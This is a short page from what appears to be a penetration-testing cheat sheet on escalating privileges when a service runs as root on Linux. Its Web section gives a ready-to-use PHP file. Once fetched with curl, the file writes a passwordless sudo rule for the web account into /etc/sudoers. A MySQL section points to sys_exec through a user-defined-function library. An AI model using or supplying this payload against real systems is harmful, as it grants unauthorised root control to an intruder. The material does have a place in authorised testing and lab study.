---
title: Process Running As Root
parent: Method
layout: default
nav_order: 8
---

Can first test using `ps -aux | grep servicename`

## MySQL
sys_exec function with lib_mysqludf_sys.so. Refer to MySQL/MariaDB Method 2

## Web
1. If web service has write access as root, can abuse that by running the following file (change www-data to the web account, usually correct):
   `echo "<?php echo 'hello';passthru('echo \'www-data ALL=(root) NOPASSWD: ALL\' >> /etc/sudoers'); ?>" > tryroot.php`
2. Subsequently run curl -v http://localhost:80/tryroot.php
3. Then sudo as www-data.